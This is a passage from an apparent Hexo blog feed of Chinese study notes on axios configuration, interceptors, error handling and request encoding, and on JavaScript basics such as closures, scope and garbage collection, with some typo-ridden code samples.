class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-comment">//data为服务器响应</span><br>    data<span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <br>    <span class="hljs-comment">//状态码</span><br>    status<span class="hljs-punctuation">:</span><span class="hljs-number">200</span><span class="hljs-punctuation">,</span><br>    <br>    <span class="hljs-comment">//HTTP状态信息</span><br>    statusText<span class="hljs-punctuation">:</span>&#x27;OK&#x27;<span class="hljs-punctuation">,</span><br>    <br>    <span class="hljs-comment">//服务器响应头</span><br>    headers<span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-comment">//axios请求的配置信息；</span><br>    config<span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-comment">//生成响应的请求</span><br>    <span class="hljs-comment">// 在node.js中它是最后一个ClientRequest实例 (in redirects)，</span><br>  <span class="hljs-comment">// 在浏览器中则是 XMLHttpRequest 实例</span><br>    request<span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="三、默认配置"><a href="#三、默认配置" class="headerlink" title="三、默认配置"></a>三、默认配置</h3><h4 id="1-全局axios默认值"><a href="#1-全局axios默认值" class="headerlink" title="1.全局axios默认值"></a>1.全局axios默认值</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">axios.<span class="hljs-property">defaults</span>.<span class="hljs-property">baseURL</span> = <span class="hljs-string">&#x27;https://api.example.com&#x27;</span>;<br>axios.<span class="hljs-property">defaults</span>.<span class="hljs-property">headers</span>.<span class="hljs-property">common</span>[<span class="hljs-string">&#x27;Authorization&#x27;</span>] = <span class="hljs-variable constant_">AUTH_TOKEN</span>;<br>axios.<span class="hljs-property">defaults</span>.<span class="hljs-property">headers</span>.<span class="hljs-property">post</span>[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>;<br></code></pre></td></tr></table></figure><h4 id="2-自定义实例默认值"><a href="#2-自定义实例默认值" class="headerlink" title="2.自定义实例默认值"></a>2.自定义实例默认值</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 创建实例时配置默认值</span><br><span class="hljs-keyword">const</span> instance = axios.<span class="hljs-title function_">create</span>(&#123;<br>  <span class="hljs-attr">baseURL</span>: <span class="hljs-string">&#x27;https://api.example.com&#x27;</span><br>&#125;);<br><br><span class="hljs-comment">// 创建实例后修改默认值</span><br>instance.<span class="hljs-property">defaults</span>.<span class="hljs-property">headers</span>.<span class="hljs-property">common</span>[<span class="hljs-string">&#x27;Authorization&#x27;</span>] = <span class="hljs-variable constant_">AUTH_TOKEN</span>;<br></code></pre></td></tr></table></figure><h4 id="3-配置的优先级"><a href="#3-配置的优先级" class="headerlink" title="3.配置的优先级"></a>3.配置的优先级</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//此时默认超时时间为0</span><br><span class="hljs-keyword">const</span> instance=axios.<span class="hljs-title function_">create</span>();<br><br><span class="hljs-comment">//重写库的超时默认值</span><br>instance.<span class="hljs-property">defaults</span>,timeout=<span class="hljs-number">2500</span>;<br><br><span class="hljs-comment">//重写超时时间</span><br>instance.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/logout&#x27;</span>,&#123;<br>    <span class="hljs-attr">timeout</span>:<span class="hljs-number">5000</span><br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="4-拦截器"><a href="#4-拦截器" class="headerlink" title="4.拦截器"></a>4.拦截器</h4><p>请求或者响应被then或者catch处理之前拦截</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//添加请求拦截器</span><br>axios.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">user</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">config</span>)&#123;<br>    <span class="hljs-comment">//发送请求前做点啥~</span><br>    <span class="hljs-keyword">return</span> config;<br>&#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">error</span>)&#123;<br>    <span class="hljs-comment">//对发送中的错误做点啥~</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error);<br>&#125;);<br><br><span class="hljs-comment">//添加响应拦截器</span><br>axios.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">user</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)&#123;<br>    <span class="hljs-comment">//2xx范围内的状态码都会触发此函数哦~</span><br>    <span class="hljs-comment">//do something.</span><br>    <span class="hljs-keyword">return</span> response;<br>&#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">error</span>)&#123;<br>    <span class="hljs-comment">//2xx以外的状态码都会触发此函数哦~</span><br>    <span class="hljs-comment">//do something.</span><br>    <span class="hljs-keyword">return</span> error;<br>&#125;);<br></code></pre></td></tr></table></figure><h5 id="移除拦截器"><a href="#移除拦截器" class="headerlink" title="移除拦截器"></a>移除拦截器</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> interceptor=axios.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">user</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><br>&#125;);<br>axios.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">eject</span>(interceptor);<br></code></pre></td></tr></table></figure><h5 id="添加拦截器"><a href="#添加拦截器" class="headerlink" title="添加拦截器"></a>添加拦截器</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> instance = axios.<span class="hljs-title function_">create</span>();<br>instance.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<span class="hljs-comment">/*...*/</span>&#125;);<br></code></pre></td></tr></table></figure><h4 id="5-错误处理"><a href="#5-错误处理" class="headerlink" title="5.错误处理"></a>5.错误处理</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js">axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/user/12345&#x27;</span>).<span class="hljs-title function_">catch</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">error</span>)&#123;<br>    <span class="hljs-keyword">if</span>(error.<span class="hljs-property">response</span>)&#123;<br>        <span class="hljs-comment">//请求成功发出且服务器响应了状态码，但是状态码超出了2xx</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(error.<span class="hljs-property">response</span>.<span class="hljs-property">data</span>);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(error.<span class="hljs-property">request</span>)&#123;<br>        <span class="hljs-comment">//请求已经发起成功，但是没有收到响应；</span><br>        <span class="hljs-comment">//error.request是浏览器中XMLHttpRequest的实例；</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(error.<span class="hljs-property">request</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//请求发出时出问题</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Error:&#x27;</span>,error.<span class="hljs-property">message</span>);<br>    &#125;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(error.<span class="hljs-property">coonfig</span>);<br>&#125;)<br></code></pre></td></tr></table></figure><h5 id="使用validataStatus配置选项，可以自定义抛出错误HttpCode"><a href="#使用validataStatus配置选项，可以自定义抛出错误HttpCode" class="headerlink" title="使用validataStatus配置选项，可以自定义抛出错误HttpCode;"></a>使用validataStatus配置选项，可以自定义抛出错误HttpCode;</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/user/12345&#x27;</span>,&#123;<br>    <span class="hljs-attr">validateStatus</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">status</span>)&#123;<br>        <span class="hljs-keyword">return</span> status&gt;<span class="hljs-number">500</span>;<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><h5 id="使用-toJSON-可以获取更多关于HTTP错误的信息。"><a href="#使用-toJSON-可以获取更多关于HTTP错误的信息。" class="headerlink" title="使用 toJSON 可以获取更多关于HTTP错误的信息。"></a>使用 <code>toJSON</code> 可以获取更多关于HTTP错误的信息。</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/user/12345&#x27;</span>)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">error</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(error.<span class="hljs-title function_">toJSON</span>());<br>  &#125;);<br></code></pre></td></tr></table></figure><h4 id="6-取消请求"><a href="#6-取消请求" class="headerlink" title="6.取消请求"></a>6.取消请求</h4><h5 id="fetechAPI-AbortController取消请求"><a href="#fetechAPI-AbortController取消请求" class="headerlink" title="fetechAPI  AbortController取消请求"></a>fetechAPI  AbortController取消请求</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> comtrollor=<span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>();<br><br>axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/foo/bar&#x27;</span>,&#123;<br>    <span class="hljs-attr">signal</span>:controller.<span class="hljs-property">singal</span><br>&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)&#123;<br>    <br>&#125;);<br><br>controllor.<span class="hljs-title function_">abort</span>();<br></code></pre></td></tr></table></figure><h5 id="CancelToken-deprecated-已弃用"><a href="#CancelToken-deprecated-已弃用" class="headerlink" title="CancelToken deprecated(已弃用)"></a>CancelToken deprecated(已弃用)</h5><h4 id="7-请求体编码"><a href="#7-请求体编码" class="headerlink" title="7.请求体编码"></a>7.请求体编码</h4><p>默认情况下，axios将js对象序列化为json；</p><p>以<code>application/x-www-form-urlencoded</code>格式发送数据；</p><h5 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> params=<span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>();<br>params.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;param1&#x27;</span>,<span class="hljs-string">&#x27;value1&#x27;</span>);<br>params.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;params2&#x27;</span>,<span class="hljs-string">&#x27;value2&#x27;</span>);<br>axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/foo&#x27;</span>,params);<br><br><span class="hljs-comment">//注意，并不是所有的浏览器都支持URLResearchParams</span><br><br><span class="hljs-comment">//qs库编码数据</span><br><span class="hljs-keyword">const</span> qs=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;qs&#x27;</span>);<br>axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/foo&#x27;</span>,qs.<span class="hljs-title function_">stringify</span>(&#123;<br>    <span class="hljs-string">&#x27;bar&#x27;</span>:<span class="hljs-number">123</span><br>&#125;));<br><br>或者<span class="hljs-title class_">ES6</span>方法<br><br><span class="hljs-keyword">import</span> qs <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;qs&#x27;</span>;<br>cosnt data=&#123;<br>    <span class="hljs-string">&#x27;bar&#x27;</span>:<span class="hljs-number">123</span><br>&#125;;<br><br><span class="hljs-keyword">const</span> options=&#123;<br>    <span class="hljs-attr">method</span>:<span class="hljs-string">&#x27;POST&#x27;</span>,<br>    <span class="hljs-attr">headers</span>:&#123; <span class="hljs-string">&#x27;content-type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span> &#125;,<br>    <span class="hljs-attr">data</span>:qs.<span class="hljs-title function_">stringify</span>(data),<br>    url,<br>&#125;;<br><span class="hljs-title function_">axios</span>(options);<br></code></pre></td></tr></table></figure><h5 id="NodeJS-使用querystring"><a href="#NodeJS-使用querystring" class="headerlink" title="NodeJS 使用querystring"></a>NodeJS 使用querystring</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><br><span class="hljs-keyword">const</span> querystring = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;querystring&#x27;</span>);<br>axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;http://something.com/&#x27;</span>, querystring.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">foo</span>: <span class="hljs-string">&#x27;bar&#x27;</span> &#125;));<br><br><span class="hljs-keyword">const</span> url = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;url&#x27;</span>);<br><span class="hljs-keyword">const</span> params = <span class="hljs-keyword">new</span> url.<span class="hljs-title class_">URLSearchParams</span>(&#123; <span class="hljs-attr">foo</span>: <span class="hljs-string">&#x27;bar&#x27;</span> &#125;);<br>axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;http://something.com/&#x27;</span>, params.<span class="hljs-title function_">toString</span>());<br><br><span class="hljs-comment">//如果需要对嵌套对象进行字符串化处理，则最好使用 qs 库，因为 querystring 方法在该用例中存在已知问题</span><br></code></pre></td></tr></table></figure><p>Form Data</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">FormData</span>=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;form-data&#x27;</span>);<br><br><span class="hljs-keyword">const</span> form =<span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>();<br>form.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;filed1&#x27;</span>,<span class="hljs-string">&#x27;value1&#x27;</span>);<br><br>axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;https://example.com&#x27;</span>,form,&#123;<span class="hljs-attr">headers</span>:<span class="hljs-keyword">from</span>.<span class="hljs-title function_">getHeaders</span>()&#125;)<br></code></pre></td></tr></table></figure><p>拦截器</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">axios.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(<span class="hljs-function"><span class="hljs-params">config</span>=&gt;</span>&#123;<br>    <span class="hljs-keyword">if</span>(config.<span class="hljs-property">data</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">FormData</span>)&#123;<br>        <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(config.<span class="hljs-property">headers</span>,config.<span class="hljs-property">data</span>.<span class="hljs-title function_">getHeaders</span>());<br>    &#125;<br>    retun config;<br>&#125;)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue笔记</title>
    <link href="/2022/10/12/JS/"/>
    <url>/2022/10/12/JS/</url>
    
    <content type="html"><![CDATA[<h1 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h1><h2 id="一、各司其职"><a href="#一、各司其职" class="headerlink" title="一、各司其职"></a>一、各司其职</h2><blockquote><p>HTML、CSS、JS职能分离</p></blockquote><p><img src="https://s3.bmp.ovh/imgs/2023/01/17/f3f6568ed1415a07.jpg"></p><h2 id="二、组件封装"><a href="#二、组件封装" class="headerlink" title="二、组件封装"></a>二、组件封装</h2><blockquote><p>好的UI组件具有正确性、拓展性、复用性</p></blockquote><h3 id="1-结构"><a href="#1-结构" class="headerlink" title="1.结构"></a>1.结构</h3><p>轮播图其实是一个列表结构；</p><p>通过css将图片层叠在一起；</p><h3 id="2-展现效果"><a href="#2-展现效果" class="headerlink" title="2.展现效果"></a>2.展现效果</h3><h3 id="3-行为"><a href="#3-行为" class="headerlink" title="3.行为"></a>3.行为</h3><p>API 功能</p><p>Event 控制流：使用自定义的事件来解耦</p><h3 id="4-改进空间"><a href="#4-改进空间" class="headerlink" title="4.改进空间"></a>4.改进空间</h3><ul><li>解耦+</li></ul><h2 id="三、过程抽象"><a href="#三、过程抽象" class="headerlink" title="三、过程抽象"></a>三、过程抽象</h2><blockquote><p>应用函数时编程思想</p></blockquote><ul><li>用来处理局部细节控制的方法</li><li>函数式编程思想的基础应用</li></ul><p>1.once</p><p>一个方法设置了timewaite以后，如果在time内多次激活方法会报错，这个时候需要用once方法来禁止多次调用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">buttons.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">button</span>)=&gt;</span>&#123;<br>    button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>,<span class="hljs-title function_">once</span>(<span class="hljs-function">(<span class="hljs-params">evt</span>)=&gt;</span>&#123;<br>        <span class="hljs-keyword">const</span> target=evt.<span class="hljs-property">target</span>;<br>        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=&gt;</span>&#123;<br>            list.<span class="hljs-title function_">removeChild</span>(target);<br>        &#125;,<span class="hljs-number">2000</span>)<span class="hljs-comment">//设置2000ms</span><br>    &#125;)，&#123;<span class="hljs-attr">once</span>:<span class="hljs-literal">true</span>&#125;)；<span class="hljs-comment">//仅允许调用一次；</span><br>&#125;)；<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//once function的实现</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">once</span>(<span class="hljs-params">fn</span>)&#123;<br>    <span class="hljs-comment">//外部闭包</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>)&#123;<br>        <span class="hljs-comment">//内部闭包</span><br>        <span class="hljs-keyword">if</span>(fn)&#123;<br>            <span class="hljs-keyword">const</span> ret=fn.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>,args);<br>            fn=<span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">return</span> ret;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>为了能够让”只执行一次“的需求覆盖不同的事件处理，我们可以将这个需求剥离出来。这个过程，我们成为<strong>过程抽象</strong></p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>JS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue笔记</title>
    <link href="/2022/09/12/JS%E5%9F%BA%E7%A1%80/"/>
    <url>/2022/09/12/JS%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="JS高级程序设计"><a href="#JS高级程序设计" class="headerlink" title="JS高级程序设计"></a>JS高级程序设计</h1><h2 id="一、基础基础基础"><a href="#一、基础基础基础" class="headerlink" title="一、基础基础基础"></a>一、基础基础基础</h2><h3 id="1-基础语法"><a href="#1-基础语法" class="headerlink" title="1.基础语法"></a>1.基础语法</h3><ul><li>for-in</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//for-in语法是一种精准的迭代语句，可以用来枚举对象的属性；</span><br><span class="hljs-keyword">for</span>(property <span class="hljs-keyword">in</span> expression)&#123;<br>    statement;<br>&#125;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> propName <span class="hljs-keyword">in</span> <span class="hljs-variable language_">window</span>)&#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(propName);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>with</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//将代码的作用域设置到一个特定的对象中</span><br><span class="hljs-title function_">with</span>(expression) statement;<br></code></pre></td></tr></table></figure><h3 id="2-变量、作用域、内存"><a href="#2-变量、作用域、内存" class="headerlink" title="2.变量、作用域、内存"></a>2.变量、作用域、内存</h3><ul><li><h5 id="基本类型和引用类型的值"><a href="#基本类型和引用类型的值" class="headerlink" title="基本类型和引用类型的值"></a>基本类型和引用类型的值</h5></li></ul><p>基本数据类型（可以直接操作保存在变量中的实际的值）：Undefined、NULL、Boolean、Number、String；</p><p>引用类型的值是保存在内存中的对象；</p><p>与其他语言不同，JS不允许直接访问内存中的位置；在操作对象时，实际操作的是对象的引用；</p><ul><li><h5 id="复制变量值"><a href="#复制变量值" class="headerlink" title="复制变量值"></a>复制变量值</h5></li></ul><p>从一个变量向另一个变量复制基本类型和引用类型时存在不同；</p><p>复制基本类型会创建基本类型的副本：</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/03/7a78a945b6267d99.jpg"></p><p>当一个变量赋值引用类型的值，同样也会将存储的值复制一份放到新变量分配的空间中国，不同的是，这个值的副本其实是一个指针，而这个指针指向存储在堆中的一个对象；</p><p>复制结束后，两个变量实际上引用同一个对象；因此改变其中一个变量会改变另一个；</p><p><img src="https://s3.bmp.ovh/imgs/2023/03/03/18376e88b0eb8200.jpg"></p><ul><li><h5 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h5></li></ul><p>ES中所有的参数都是按值传递的；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">num</span>)&#123;<br>    num+=<span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">return</span> num;<br>&#125;<br><br><span class="hljs-keyword">var</span> count=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">var</span> result=<span class="hljs-title function_">add</span>(count);<br><br><span class="hljs-comment">//result=30,count=20不变</span><br><span class="hljs-comment">//这是因为addTen()中的参数num是count的值传递，而不是引用传递两者是相互无关的。</span><br></code></pre></td></tr></table></figure><ul><li>检测类型</li></ul><p>要检测一个变量是不是基本类型？（typeof)</p><p>检测基本数据类型时，typeof很好用，但是检测引用类型用处不大，需要使用instanceof;</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">tpyeof s;<br>variable <span class="hljs-keyword">instanceof</span> constructor<br></code></pre></td></tr></table></figure><ul><li>作用域</li></ul><p>Web浏览器中，全局执行环境被认为是window对象；</p><p>每个函数都有自己的执行环境，当执行流进入一个函数时，函数的环境会被推入一个环境栈中；</p><p>代码在一个环境中执行时，会创建变量对象的一个作用域链（scope chanin）：其作用是为了保证对执行环境有权访问的所有变量和函数有序的访问；</p><ul><li>延长作用域链</li></ul><p>有些语句可以在作用域链的前端临时增加一个变量对象，该变量对象在代码执行后被移除；</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">try</span>-<span class="hljs-keyword">catch</span>语句的<span class="hljs-keyword">catch</span><br><span class="hljs-keyword">with</span>语句<br></code></pre></td></tr></table></figure><h3 id="3-垃圾收集"><a href="#3-垃圾收集" class="headerlink" title="3.垃圾收集"></a>3.垃圾收集</h3><p>JS具有自动垃圾收集机制，执行环境会负责管理代码执行过程中使用的内存。</p><p>原理：找出不再使用的变量，释放内存；垃圾收集器按照固定时间间隔周期性执行；</p><ul><li>标记清除</li></ul><p>当变量进入环境，标记为进入环境，方法可能是设置标志位；</p><ul><li>引用计数</li></ul><p>记录每个值被引用的次数，当声明了一个变量并且将一个引用类型赋给该变量，则这个值的引用次数就是1；</p><p>一个值赋给一个变量，引用次数+1；相反对这个值引用的变量右取得了另一个值，则引用次数-1；</p><p>问题：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">problem</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> objA=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>    <span class="hljs-keyword">var</span> objB=<span class="hljs-keyword">new</span> <span class="hljs-title function_">object</span>();<br>    <br>    objectA.<span class="hljs-property">someOtherObject</span>=objectB;<br>    objectA.<span class="hljs-property">anotherObject</span>=objectA;<br>&#125;<br></code></pre></td></tr></table></figure><p>ObjectA和B通过各自的属性相互引用，两个对象的引用次数都是2；</p><p>这会导致函数执行后继续存在，引用次数永远不会为0；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span 